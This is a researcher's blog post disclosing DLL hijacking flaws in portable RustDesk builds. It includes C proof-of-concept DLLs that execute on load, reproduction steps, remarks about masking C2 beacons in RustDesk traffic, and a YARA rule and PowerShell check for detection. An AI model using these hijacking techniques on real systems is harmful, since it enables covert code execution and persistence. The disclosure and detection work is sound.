---
layout: post
title:  "RustDesk - DLL Injection Vulnerabilities (CVE-2025-XXXX)"
category : CVE
tags :  CVE DLL-Injection Vulnerability RustDesk
---
Welcome to my very first blog post ! 🎉 I’m super excited to start this journey of sharing my experiments and learnings with y'all. My goal is to document my journey into malware development and red team/pentesting techniques. Feel free to follow me on X or LinkedIn !

## Description

In this blog post, I want to share two vulnerabilities I discovered during my research into backdooring Portable Executable (PE) files. My initial goal was to experiment with modifying PE files and adding functionality to them. As part of this process, I picked RustDesk, which is a popular open-source remote desktop application, as my test subject. To my surprise, I stumbled upon two DLL injection vulnerabilities in RustDesk.

This post documents the journey of how I discovered this vulnerability, the technical details, its implications, and some recommendations for mitigation.

![](assets/attachment/db35c94c7ba39d49fc922d48625d4456.png){: width="370"}

## Why RustDesk ?

My research started with a simple curiosity: how can I backdoor PE files effectively ? As part of this experiment, I decided to work with real-world applications to better understand the challenges and opportunities in modifying PE files. RustDesk caught my attention due to its "simplicity", open-source nature, and the fact that it's gaining traction as a remote desktop solution.

I initially intended to use RustDesk as just another PE file to test my backdooring techniques. However, as I dug deeper, I identified two DLL injection vulnerabilities within its portable version.

## Finding The Culprit

DLL injection is a technique where an attacker forces a process to load a malicious DLL, allowing them to execute arbitrary code *within* the context of that process. This can lead to serious consequences, such as privilege escalation, sensitive data exfiltration, or persistence (my favorite method of persistence btw ^^).

While testing the portable 32-bit version of RustDesk v1.3.6, I discovered that it does not properly validate or restrict the loading of DLLs. Specifically:

- The vulnerable version is the **portable v1.3.6 (32 and 64-bit) versions** of RustDesk.
- RustDesk searches for certain DLLs in its working directory (the directory containing the executable).
- By placing a malicious DLL with the same name as one of the required libraries in the same directory as the RustDesk executable, I was able to inject arbitrary code into the RustDesk process.

![](assets/attachment/33c03076548a051c792c0464cfe108c9.png)

As you can see from the screenshot (hopefully), there were a few missing DLLs. But what really caught my attention was the `nvcuda.dll` file. Since I had no NVIDIA drivers installed on this machine, the DLL could not be properly loaded. So in theory, creating a DLL, naming it `nvcuda.dll` and placing it in the same directory as the executable should launch the malicious code ! I immediately crafted a PoC and tested it.

![](assets/attachment/8f907ffce2ea8ad7314796ee1b042f49.png)

The code (C/C++):

```c
/*

    Author:         Arthur Minasyan (B0lg0r0v)
    Date:           02.01.2025
    Description:    PoC for DLL Injection in 32 and 64-Bit PE of RustDesk

*/
#include <windows.h>

VOID MsgBoxPayload() {

    // Creating a semaphore for execution control
    HANDLE hSemaphore = CreateSemaphoreA(NULL, 10, 10, "Yolo");

    if (hSemaphore != NULL && GetLastError() == ERROR_ALREADY_EXISTS) {

        // Do nothing
    } else {
    
        // The actual payload
        MessageBoxA(NULL, "DLL Injection Successfully performed!", "DLL Injection", MB_OK | MB_ICONINFORMATION | MB_TOPMOST);
    
    }

}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call) {
    
	    case DLL_PROCESS_ATTACH:
	        MsgBoxPayload();
	        break;
	    case DLL_THREAD_ATTACH:
	    case DLL_THREAD_DETACH:
	    case DLL_PROCESS_DETACH:
	        break;
    
    }
    
    return TRUE;

}
```

This is a very simple PoC that pops a *MessageBox* if the DLL is successfully loaded in the memory space of RustDesk. 

Steps to reproduce:

1. Compile the above code into a DLL.
2. Rename the DLL to `nvcuda.dll`.
3. Place the DLL in the same directory as the RustDesk executable.
4. Run RustDesk, which loads the malicious DLL, triggering the message box.
5. ??? 
6. Profit

![](assets/attachment/8e0b5abecae8cb182fd33a9ae291fa4e.png)

## Windows Strikes Back

As mentioned above, the previous DLL Injection vulnerability *only* worked if the system did **NOT** have some NVIDIA drivers installed. I'm not sure if this is common on enterprise networks. Virtualised environments should not ship these drivers, so probably not that common.

Fortunately (or unfortunately, depends on how you see it :D) I discovered another DLL injection vulnerability: this time targeting a Windows DLL. The culprit ?  `windowscodecs.dll`. I'm not entirely sure what this DLL does, but I know for a fact that it's part of the *Windows Imaging Component*. 

- The vulnerable versions are the **portable 32 and 64-bit versions** of RustDesk.
- All versions of RustDesk are affected.

However, using the same PoC as before resulted in an error !

![](assets/attachment/8dcf3da5bedccb1827693a7bd38ae700.png)

**Why is that so ?**

### DLL Mechanism

I'm not gonna explain what a DLL is. There are plenty of resources out there that cover this subject far better than me. However I would like to quickly talk about *exports*.

DLLs *can* export functions that other applications can use. For example the function *VirtualAlloc* is being exported by *Kernel32.dll*. If we take a look at `Kernel32.dll` using `dumpbin`, we can indeed see that `VirtualAlloc` is being exported.

![](assets/attachment/58e35746f1203b3e63d06330c5af92de.png)

Alternatively, if you prefer a GUI, you can use *PEBear*:

![](assets/attachment/a4707391f6973e6275f70063f0915f8b.png)

By loading `kernel32.dll` into it's memory space, an application gains access to all the functions this DLL exports. 

This behavior explains our issue with `windowscodecs.dll`: RustDesk is trying to access a specific function that `windowscodecs.dll` exports. Since our malicious DLL does not export any functions, the application simply crashes when trying to call it.

### Extending The PoC

First, we need to examine the imports of RustDesk to determine what function (or functionS ?) it tries to call from `windowscodecs.dll`. This following command does the trick:

```powershell
dumpbin /imports "C:\Users\std\Documents\Vulnerability Research\RustDesk\64bit\rustdesk-1.3.7-x86_64.exe"
```

![](assets/attachment/8298c339507022da165b8598d219175e.png)

Fortunately, RustDesk only attempts to call a single function called `WICConvertBitmapSource`. With that in mind, I updated the PoC code as follows:

```c
/*

    Author:             Arthur Minasyan (B0lg0r0v)
    Date:               29.01.2025
    Description:        PoC for DLL Injection in 32 & 64-Bit PE of RustDesk
    Vulnerable DLL:     windowscodecs.dll

*/
#include <windows.h>


// This function is being exposed because RustDesk needs it.
extern __declspec(dllexport) void WICConvertBitmapSource() {

	// we do nothing at all
}

VOID MsgBoxPayload() {

    // Creating a semaphore for execution control
    HANDLE hSemaphore = CreateSemaphoreA(NULL, 10, 10, "Yolo");

    if (hSemaphore != NULL && GetLastError() == ERROR_ALREADY_EXISTS) {

        // Do nothing
    } else {
    
        // The actual payload
        MessageBoxA(NULL, "DLL Injection Successfully performed!", "DLL Injection", MB_OK | MB_ICONINFORMATION | MB_TOPMOST);
    
    }

}

BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved ) {
    
    switch (ul_reason_for_call) {
    
		case DLL_PROCESS_ATTACH:
			MsgBoxPayload();
			break;
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
		
		}
    
    return TRUE;
}
```

We can then take a look at the exports of the malicious DLL file (using PEBear for convenience):


![](assets/attachment/6c9022100f23352bed2484975badb3c7.png)

We successfully exported the function :D ! The DLL Injection should now work:

![](assets/attachment/e083f07ac3ae47827114fa85f6d2548b.gif)

## Unpatchable Chaos

As I said, the first vulnerability using `nvcuda.dll` had a limitation: it only worked if the target system did not have NVIDIA drivers installed. However the issue with `windowscodecs.dll` seems to be far more serious.

`windowscodecs.dll` is a core Windows DLL that every system needs, and from my understanding:

- Microsoft **has no built-in protections** to prevent hijacking of this DLL in the application directory
- Windows **does not treat it as a KnownDLL** (unlike `ntdll.dll`, `kernelbase.dll`, etc.)

Even RustDesk developers tried to patch this issue but found that the DLL is not loaded via *LoadLibrary(Ex)*, making it extremely difficult to control.

I also examined some of Microsoft's own products (like *OneDrive*) and found out that they also have some DLL Hijacking vulnerabilities. This made me believe that this issue seems **not patchable** by the Rustdesk dev team.

### Detection

Since **we can’t patch this** without Microsoft's aid, the only option is **to detect and monitor it**. For this, I've made a VERY simple YARA rule to detect unauthorized copies of `windowscodecs.dll`. It basically checks if the PE exports the function "WICConvertBitmapSource". If it does, it also checks against the valid SHA-256 hash of the *real* `windowscodecs.dll`.

```YARA
import "hash"
import "pe"
import "math"

rule Rustdesk_WindowsCodecs_DLL_HashCheck {
    meta:
        description = "Detects rogue versions of windowscodecs.dll via hash & PE export verification"
        author = "Arthur Minasyan (B0lg0r0v)"
        date = "2025-02-5"

    condition:
        pe.exports("WICConvertBitmapSource") and
	not (
		hash.sha256(0, filesize) == "e59240b36bfd12e3fb8594e14f3777ab3688817f8de761db1b1c6f70743022d0" or
		hash.sha256(0, filesize) == "ff69f4fc1fcbc39ae8fc88b9e206fe2ec273a5ef3d14981a70093e1f0c77d288"
	)
	
}
```

The issue with this method is that the hash of `windowscodecs.dll` seems to be changing frequently. A more robust way would be to programmatically calculate the hash of the *real* `windowscodecs.dll`and then check it against the hash of the suspected DLL. Below is a simple PowerShell script that automates this :

```powershell
# Get the official windowscodecs.dll hash from System32
$RealWindowscodecsDLL = "C:\Windows\System32\windowscodecs.dll"
$RealHash = (Get-FileHash -Path $RealWindowscodecsDLL -Algorithm SHA256).Hash

# Define paths to search for suspicious DLLs
$SearchPaths = @("C:\Users\", "C:\Program Files\", "C:\Program Files (x86)\") # Define other paths here
$SuspiciousDLLs = Get-ChildItem -Path $SearchPaths -Recurse -Filter "windowscodecs.dll" -ErrorAction SilentlyContinue

# Compare hashes
foreach ($DLL in $SuspiciousDLLs) {
    $DLLHash = (Get-FileHash -Path $DLL.FullName -Algorithm SHA256).Hash
    if ($DLLHash -ne $RealHash) {
        Write-Host "WARNING: rogue windowscodecs.dll detected at $($DLL.FullName)."
        Write-Host "Expected Hash: $RealHash"
        Write-Host "Found Hash: $DLLHash"
    } else {
        # We're doing nothing, since it matches.
    }
}
```

I am by no means an expert on creating detections rules.. so it would be great if someone more competent could improve this.

## Why Do We Even Care ?

RustDesk is a remote desktop application that *could* be used in sensitive environments. Exploiting this vulnerability allows an attacker to execute arbitrary code in the **context** of the RustDesk process, which might:

- **Gain elevated privileges**: If RustDesk runs with higher privileges (e.g., as an administrator), the attacker gains similar level of access.
- **Maintain persistence**: The attacker can use DLL injection as a means to remain undetected on the system.

Operating within the process context of RustDesk also helps attackers evade detection. For example, placing a beacon that connects back to a C2 server becomes particularly effective because, by design, RustDesk generates constant traffic in and out of the process. This legitimate-looking traffic can help mask malicious activity, making it harder to detect.

Attackers could also use *DLL sideloading* to "completely" masquerade their payloads. But this is a topic for another time :P !

## Responsible Disclosure

Before writing this blog post, I responsibly disclosed the vulnerability to the RustDesk team. They acknowledged the issue and responded incredibly quickly. In fact, I was impressed by how collaborative and proactive they were in finding a solution. 

We worked together to identify fixes that would address the vulnerability without compromising usability or breaking compatibility with third-party libraries. Their dedication to improving security while maintaining a great user experience was outstanding.

The `nvcuda.dll` vulnerability has been patched. However, the **`windowscodecs.dll` vulnerability cannot be fully fixed** due to how Windows loads DLLs. Because of this, users should implement detection mechanisms to identify potential abuse.

I was really hesitant publishing this blog post, knowing that there is a vulnerability that cannot be fixed easily. My main concern was : "What if bad actors come across this and use it for malicious purposes ?". I mean.. sure, that could happen. But on the other hand, I felt the responsibility to notify the community and raise awareness. The more people who know about this issue, the better detection mechanisms can be developed, and users can take precautions.

At the end of the day, a vulnerability doesn't stop existing just because it isn't talked about. And if a bad actor discovers it first, defenders won’t have the upper hand.

![](assets/attachment/f57906a3eb81c6e640030a16fe260957.jpg){: width="370"}

## Mitigations and Recommendations

I am by no means an expert, but the typical recommendations are:

1. **Use Absolute Paths**: Ensure DLLs are loaded from secure, absolute paths rather than relying on relative paths.
2. **Restrict Writable Directories**: Avoid loading libraries from user-writable directories like `AppData\Local`.
3. **Code Signing**: Validate the digital signatures of all loaded DLLs.
4. **Secure Load Functions**: Use functions like `SetDefaultDllDirectories` to restrict where the application looks for DLLs.

## Conclusion

This research started as an exploration into backdooring PE files but turned into uncovering a real-world vulnerability. It highlights the importance of secure development practices, especially in applications handling sensitive tasks like remote desktop software.

I also want to commend the RustDesk team for their professionalism and quick response. They worked with me to resolve the issues, demonstrating a commitment to security and transparency that’s commendable for any software project.

## Thanks

Thanks to Tuuli for proofreading ! ^^
